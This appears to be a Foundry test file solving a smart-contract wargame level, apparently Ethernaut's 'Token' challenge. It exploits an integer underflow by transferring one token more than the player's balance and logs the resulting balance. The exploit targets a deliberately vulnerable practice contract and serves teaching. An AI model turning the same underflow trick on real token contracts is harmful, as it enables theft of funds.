// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {SetUpLevelTest} from "../SetUpLevelTest.sol";
import {Token, TokenFactory} from "../helpers/TokenFactory.sol";

contract TokenLevel is SetUpLevelTest {
    Token internal token;

    function setUp() public override {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        playerBalance = 0 ether;
        instanceBalance = 0 ether;
        level = address(new TokenFactory());
        super.setUp();
        token = Token(instance);

        /** CODE YOUR SOLUTION HERE */
        vm.startPrank(player);
        emit log_named_uint("balance before exploit", token.balanceOf(player));
        token.transfer(address(0), token.balanceOf(player) + 1);
        emit log_named_uint("balance after exploit", token.balanceOf(player));
        vm.stopPrank();
    }
}
